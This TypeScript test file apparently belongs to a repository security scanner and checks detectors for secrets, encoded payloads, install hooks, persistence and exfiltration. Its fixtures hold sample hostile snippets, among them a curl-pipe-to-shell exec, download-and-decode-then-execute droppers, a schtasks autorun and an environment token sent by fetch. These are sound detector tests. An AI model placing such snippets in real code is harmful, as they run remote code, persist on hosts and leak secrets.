import test from "node:test";
import assert from "node:assert/strict";
import type { FileRecord } from "../../../../utils/file-system.js";
import { normalizeConfidenceValue } from "../../../../utils/confidence.js";
import { normalizeFindingCategory } from "../../finding-classifier.js";
import { binaryArtifactDetector } from "../binaryArtifactDetector.js";
import { encodedPayloadDetector } from "../encodedPayloadDetector.js";
import { decodedPayloadExecutionDetector } from "../decodedPayloadExecutionDetector.js";
import { exfiltrationDetector } from "../exfiltrationDetector.js";
import { fragmentedAssemblyDetector } from "../fragmentedAssemblyDetector.js";
import { installHooksDetector } from "../installHooksDetector.js";
import { keyMaterialDetector } from "../keyMaterialDetector.js";
import { persistenceBehaviorDetector } from "../persistenceBehaviorDetector.js";
import { secretPatternDetector } from "../secretPatternDetector.js";
import { secretExfilChainDetector } from "../secretExfilChainDetector.js";
import { suspiciousCommandDetector } from "../suspiciousCommandDetector.js";
import { stagedPayloadDetector } from "../stagedPayloadDetector.js";
import { suspiciousFilenameDetector } from "../suspiciousFilenameDetector.js";

function file(relativePath: string, content: string | undefined, size = content?.length ?? 2048, extension?: string): FileRecord {
  return {
    relativePath,
    absolutePath: relativePath,
    extension: extension ?? relativePath.slice(relativePath.lastIndexOf(".")).toLowerCase(),
    content,
    size
  };
}

test("normalizeConfidenceValue maps text levels to numeric range", () => {
  assert.equal(normalizeConfidenceValue("low"), 0.35);
  assert.equal(normalizeConfidenceValue("medium"), 0.65);
  assert.equal(normalizeConfidenceValue("high"), 0.85);
  assert.equal(normalizeConfidenceValue("85%"), 0.85);
});

test("normalizeFindingCategory maps rule ids to canonical categories", () => {
  assert.equal(normalizeFindingCategory({ ruleId: "execution.suspicious-shell-spawn", title: "x", category: "other", detector: "suspiciousCommandDetector", filePath: "src/a.js" }), "execution");
  assert.equal(normalizeFindingCategory({ ruleId: "secret.template.placeholder", title: "x", category: "other", detector: "secretPatternDetector", filePath: ".env.example" }), "secret");
  assert.equal(normalizeFindingCategory({ ruleId: "installHooks.present", title: "x", category: "other", detector: "installHooksDetector", filePath: "package.json" }), "workflow");
});

test("suspiciousFilenameDetector keeps doc-like password filenames low severity", async () => {
  const findings = await suspiciousFilenameDetector.detect({
    files: [file("docs/password_reset_flow.md", "This guide describes the password reset flow and recovery steps.")]
  });

  assert.equal(findings[0]?.severity, "low");
  assert.equal(findings[0]?.category, "filename-risk");
  assert.match(findings[0]?.falsePositiveNote ?? "", /Tài liệu|documentation/i);
});

test("suspiciousFilenameDetector keeps filename-only credential signals low severity", async () => {
  const findings = await suspiciousFilenameDetector.detect({
    files: [file("scripts/backup_passwords.sh", `#!/bin/bash
echo backup finished`)]
  });

  assert.equal(findings[0]?.severity, "low");
});

test("suspiciousFilenameDetector does not auto-upgrade .env filename without real secret content", async () => {
  const findings = await suspiciousFilenameDetector.detect({
    files: [file(".env", `# local env template
API_URL=http://localhost:3000`)]
  });

  assert.equal(findings[0]?.severity, "low");
  assert.equal(findings[0]?.category, "config-risk");
});

test("encodedPayloadDetector classifies hex blob without double-flagging as base64", async () => {
  const hexBlob = "a1".repeat(80);
  const findings = await encodedPayloadDetector.detect({
    files: [file("src/blob.txt", `const blob = "${hexBlob}";`)]
  });

  assert.equal(findings.length, 1);
  assert.equal(findings[0]?.ruleId, "encoded.hex.long-sequence");
});

test("keyMaterialDetector detects PEM private key markers", async () => {
  const findings = await keyMaterialDetector.detect({
    files: [file("keys/dev.pem", `-----BEGIN PRIVATE KEY-----
abc
-----END PRIVATE KEY-----`)]
  });

  assert.equal(findings[0]?.severity, "high");
  assert.equal(findings[0]?.category, "key-material");
  assert.equal(findings[0]?.lineNumber, 1);
});

test("binaryArtifactDetector lowers severity for build artifacts in expected dirs", async () => {
  const findings = await binaryArtifactDetector.detect({
    files: [file("build/libs/payload.jar", undefined, 640000, ".jar")]
  });

  assert.equal(findings[0]?.severity, "low");
  assert.equal(findings[0]?.category, "artifact");
});

test("installHooksDetector maps install hooks to workflow category", async () => {
  const findings = await installHooksDetector.detect({
    files: [file("package.json", JSON.stringify({ scripts: { prepare: "npm run build" } }))]
  });

  assert.equal(findings[0]?.category, "workflow");
  assert.equal(findings[0]?.ruleId, "installHooks.present");
});

test("suspiciousCommandDetector uses execution category and specific recommendation", async () => {
  const findings = await suspiciousCommandDetector.detect({
    files: [file("scripts/install.js", `const cp = require('child_process');
cp.exec('curl http://x | sh')`)]
  });

  assert.equal(findings[0]?.category, "execution");
  assert.match(findings[0]?.recommendation ?? "", /exec|API|đầu vào|runtime/i);
});

test("secretPatternDetector groups template placeholders into one low finding", async () => {
  const findings = await secretPatternDetector.detect({
    files: [file("config/templates/secrets.template.env", `API_KEY=<replace_me>
SECRET_KEY=your_key_here
PASSWORD=CHANGE_ME`)]
  });

  assert.equal(findings.length, 1);
  assert.equal(findings[0]?.ruleId, "secret.template.placeholder");
  assert.equal(findings[0]?.severity, "low");
  assert.equal(findings[0]?.matchCount, 3);
  assert.deepEqual(findings[0]?.relatedLineNumbers, [1, 2, 3]);
  assert.match(findings[0]?.falsePositiveNote ?? "", /Likely template or placeholder/i);
});

test("secretPatternDetector detects hardcoded secrets in file content", async () => {
  const findings = await secretPatternDetector.detect({
    files: [file(".env", `OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrstuvwxyz123456
DB_PASSWORD=supersecretvalue`)]
  });

  assert.ok(findings.some((finding) => finding.ruleId === "secret.env.openai-api-key"));
  assert.ok(findings.some((finding) => finding.ruleId === "secret.env.db-password"));
});


test("persistenceBehaviorDetector detects autorun registration patterns", async () => {
  const findings = await persistenceBehaviorDetector.detect({
    files: [file("scripts/install.ps1", "schtasks /create /sc onlogon /tn demo /tr calc.exe")]
  });

  assert.equal(findings[0]?.ruleId, "execution.persistence.autorun-registration");
  assert.equal(findings[0]?.category, "execution");
});

test("exfiltrationDetector detects secret-like outbound requests", async () => {
  const findings = await exfiltrationDetector.detect({
    files: [file("src/beacon.py", "requests.post(url, headers={\"Authorization\": os.environ[\"API_TOKEN\"]})")]
  });

  assert.equal(findings[0]?.ruleId, "execution.exfiltration.secret-over-network");
  assert.equal(findings[0]?.category, "execution");
});

test("stagedPayloadDetector detects download-write-execute chains", async () => {
  const findings = await stagedPayloadDetector.detect({
    files: [file("src/loader.py", `import requests
payload = requests.get(url).text
with open("tmp.exe", "wb") as fh:
    fh.write(payload.encode())
subprocess.run("tmp.exe")`)]
  });

  assert.equal(findings[0]?.ruleId, "execution.chain.download-write-execute");
  assert.equal(findings[0]?.category, "execution");
  assert.ok((findings[0]?.relatedLineNumbers?.length ?? 0) >= 3);
});



test("secretExfilChainDetector detects secret-read to outbound request chains", async () => {
  const findings = await secretExfilChainDetector.detect({
    files: [file("src/beacon.ts", "const token = process.env.API_TOKEN; await fetch(url, { headers: { Authorization: `Bearer ${token}` } });")]
  });

  assert.equal(findings[0]?.ruleId, "execution.chain.secret-read-exfiltration");
  assert.equal(findings[0]?.category, "execution");
  assert.ok((findings[0]?.relatedLineNumbers?.length ?? 0) >= 1);
});

test("decodedPayloadExecutionDetector detects decode-write-execute chains", async () => {
  const findings = await decodedPayloadExecutionDetector.detect({
    files: [file("src/dropper.js", `const raw = atob(payload);
fs.writeFileSync("tmp.exe", raw);
exec("tmp.exe");`) ]
  });

  assert.equal(findings[0]?.ruleId, "execution.chain.decode-write-execute");
  assert.equal(findings[0]?.category, "execution");
  assert.ok((findings[0]?.relatedLineNumbers?.length ?? 0) >= 3);
});


test("fragmentedAssemblyDetector detects suspicious payload assembled across files", async () => {
  const base64 = "QUJD".repeat(40);
  const findings = await fragmentedAssemblyDetector.detect({
    files: [
      file("src/loader.js", `const payload = fs.readFileSync("parts/a.txt", "utf8") + fs.readFileSync("parts/b.txt", "utf8");
exec(payload);`),
      file("src/parts/a.txt", base64.slice(0, 24)),
      file("src/parts/b.txt", base64.slice(24))
    ]
  });

  assert.equal(findings[0]?.ruleId, "encoded.fragmented-base64-assembly");
  assert.equal(findings[0]?.category, "encoded-content");
  assert.ok((findings[0]?.matchCount ?? 0) >= 2);
});

test("fragmentedAssemblyDetector skips benign multi-file assembly", async () => {
  const findings = await fragmentedAssemblyDetector.detect({
    files: [
      file("src/joiner.py", `a = open("parts/a.txt").read()
b = open("parts/b.txt").read()
value = a + b
print(value)`),
      file("src/parts/a.txt", "hello "),
      file("src/parts/b.txt", "world")
    ]
  });

  assert.equal(findings.length, 0);
});
